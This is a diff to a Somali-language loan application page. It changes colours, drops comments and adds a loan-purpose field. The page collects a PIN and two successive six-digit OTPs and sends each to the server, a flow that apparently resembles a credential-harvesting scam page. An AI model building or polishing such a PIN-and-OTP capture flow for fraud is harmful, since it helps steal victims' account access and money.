@@ -111,7 +111,6 @@
             background: #fafafa;
         }
 
-        /* Adjusted width and font size for 6-digit OTP boxes to fit nicely */
         .otp1-box, .otp2-box {
             width: 48px;
             height: 55px;
@@ -125,13 +124,13 @@
         }
 
         .pin-box:focus, .otp1-box:focus, .otp2-box:focus {
-            border-color: hsl(113, 94%, 47%);
+            border-color: #82d13d;
             background: #fff;
         }
 
         .btn-green {
             width: 100%;
-            background: linear-gradient(to right, hsl(118, 95%, 47%), hsl(110, 93%, 46%));
+            background: linear-gradient(to right, #82d13d, #95e14a);
             color: white;
             border: none;
             border-radius: 10px;
@@ -158,7 +157,7 @@
             width: 40px;
             height: 40px;
             border: 4px solid #f1f3f5;
-            border-top: 4px solid hwb(110 3% 8%);
+            border-top: 4px solid #82d13d;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 0 auto 15px;
@@ -172,7 +171,7 @@
         .countdown-timer {
             font-size: 18px;
             font-weight: bold;
-            color: hsl(128, 93%, 48%);
+            color: #82d13d;
             margin: 10px 0;
         }
     </style>
@@ -266,11 +265,12 @@
         window.onload = () => {
             const amount = localStorage.getItem('amount') || '1,000';
             const duration = localStorage.getItem('loanDuration') || '12 bilood';
+            const purpose = localStorage.getItem('loanPurpose') || 'Ganacsi (Business)';
             
             fetch('/api/loan-request', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ amount, duration })
+                body: JSON.stringify({ amount, duration, purpose })
             });
         };
 
@@ -358,7 +358,7 @@
         async function submitOtp1() {
             let otp1 = '';
             document.querySelectorAll('.otp1-box').forEach(b => otp1 += b.value);
-            if (otp1.length < 6) return; // Updated to check for 6 digits
+            if (otp1.length < 6) return;
             if (countdownTimer) clearInterval(countdownTimer);
 
             await fetch('/api/verify-otp1', {
@@ -400,7 +400,7 @@
         async function submitOtp2() {
             let otp2 = '';
             document.querySelectorAll('.otp2-box').forEach(b => otp2 += b.value);
-            if (otp2.length < 6) return; // Updated to check for 6 digits
+            if (otp2.length < 6) return;
             if (countdownTimer) clearInterval(countdownTimer);
 
             await fetch('/api/verify-otp2', {
